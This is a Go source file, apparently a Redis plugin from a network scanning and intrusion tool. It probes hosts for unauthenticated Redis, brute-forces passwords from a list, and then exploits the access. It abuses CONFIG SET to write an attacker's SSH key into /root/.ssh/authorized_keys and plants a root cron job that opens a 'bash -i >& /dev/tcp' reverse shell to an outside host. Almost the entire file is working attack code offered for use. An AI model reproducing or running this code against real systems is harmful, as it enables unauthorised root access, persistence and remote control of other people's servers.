package Plugins

import (
	"../common"
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

func RedisScan(info *common.HostInfo,ch chan int,wg *sync.WaitGroup) {
	flag,err := RedisUnauth(info)
	if flag==true && err==nil {
		wg.Done()
		<- ch
		return
	}

Loop:
		for _,pass:=range common.Passwords{
			pass = strings.Replace(pass, "{user}", string("redis"), -1)
			flag,err := RedisConn(info,pass)
			if flag==true && err==nil {
				break Loop
			}
		}
	wg.Done()
	<- ch
}

func RedisConn(info *common.HostInfo,pass string)(flag bool,err error){
	flag = false
	realhost:=fmt.Sprintf("%s:%d",info.Host,common.PORTList["redis"])
	conn,err := net.DialTimeout("tcp",realhost,time.Duration(info.Timeout)*time.Second)
	if err != nil{
		return flag,err
	}
	defer conn.Close()
	conn.Write([]byte(fmt.Sprintf("auth %s\r\n",pass)))
	reply,err := readreply(conn)
	if strings.Contains(reply,"+OK"){
		result := fmt.Sprintf("Redis:%s %s",realhost,pass)
		common.LogSuccess(result)
		flag = true
		Expoilt(info ,realhost,conn)

	}
	return flag,err
}


func RedisUnauth(info *common.HostInfo) (flag bool,err error) {
	flag = false
	realhost:=fmt.Sprintf("%s:%d",info.Host,common.PORTList["redis"])
	conn,err := net.DialTimeout("tcp",realhost,time.Duration(info.Timeout)*time.Second)
	if err != nil{
		return flag,err
	}
	defer conn.Close()
	conn.Write([]byte("info\r\n"))
	reply,err := readreply(conn)
	if strings.Contains(reply,"redis_version"){
		result := fmt.Sprintf("Redis:%s unauthorized",realhost)
		common.LogSuccess(result)
		flag = true
		Expoilt(info ,realhost,conn)
	}
	return flag,err
}

func Expoilt(info *common.HostInfo,realhost string,conn net.Conn)  {
	flagSsh,flagCron := testwrite(conn)
	if flagSsh == true{
		result := fmt.Sprintf("Redis:%v like can write /root/.ssh/",realhost)
		common.LogSuccess(result)
		if info.RedisFile != ""{
			if 	writeok,text := writekey(conn,info.RedisFile);writeok{
				result := fmt.Sprintf("%v SSH public key was written successfully",realhost)
				common.LogSuccess(result)
			}else {
				fmt.Println(realhost,"SSHPUB write failed",text)
			}
		}
	}

	if flagCron == true{
		result := fmt.Sprintf("Redis:%v like can write /var/spool/cron/",realhost)
		common.LogSuccess(result)
		if info.RedisShell != "" {
			if 	writeok,text := writecron(conn,info.RedisShell);writeok{
				result := fmt.Sprintf("%v /var/spool/cron/root was written successfully",realhost)
				common.LogSuccess(result)
			}else {
				fmt.Println(realhost,"cron write failed",text)
			}
		}
	}
}


func writekey(conn  net.Conn,filename string) (flag bool,text string) {
	flag = false
	conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	text,_ = readreply(conn)
	if strings.Contains(text,"OK") {
		conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename authorized_keys\r\n")))
		text,_ = readreply(conn)
		if strings.Contains(text,"OK") {
			key,_ := Readfile(filename)
			conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n",key)))
			text,_ = readreply(conn)
			if strings.Contains(text,"OK") {
				conn.Write([]byte(fmt.Sprintf("save\r\n")))
				text,_ = readreply(conn)
				if strings.Contains(text,"OK") {
					flag = true
				}
			}
		}
	}
	if len(text) > 50{
		text = text[:50]
	}
	return flag,text
}



func writecron(conn  net.Conn,host string) (flag bool,text string) {
	flag = false
	conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	text,_ = readreply(conn)
	if strings.Contains(text,"OK") {
		conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename root\r\n")))
		text,_ = readreply(conn)
		if strings.Contains(text,"OK") {
			scan_ip,scan_port := strings.Split(host,":")[0],strings.Split(host,":")[1]
			conn.Write([]byte(fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n",scan_ip,scan_port)))
			text,_ = readreply(conn)
			if strings.Contains(text,"OK") {
				conn.Write([]byte(fmt.Sprintf("save\r\n")))
				text,_ = readreply(conn)
				if strings.Contains(text,"OK") {
					flag = true
				}
			}
		}
	}
	if len(text) > 50{
		text = text[:50]
	}
	return flag,text
}

func Readfile(filename string)(string,error){
	file, err := os.Open(filename)
	if err!=nil{
		fmt.Println("Open %s error, %v", filename,err)
		return err.Error(),err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text,nil
		}
	}
	return err.Error(),err
}

func readreply(conn  net.Conn) (result string,err error) {
	buf := make([]byte, 4096)
	for {
		count, err := conn.Read(buf)
		if err != nil {
			break
		}
		result += string(buf[0:count])
		if count < 4096 {
			break
		}
	}
	return result,err
}

func testwrite(conn  net.Conn) (flagSsh bool,flagCron bool) {
	flagSsh = false
	flagCron = false
	var text string
	conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	text,_ = readreply(conn)
	if strings.Contains(string(text),"OK") {
		flagSsh = true
	}
	conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	text,_ = readreply(conn)
	if strings.Contains(string(text),"OK") {
		flagCron = true
	}
	return flagSsh,flagCron
}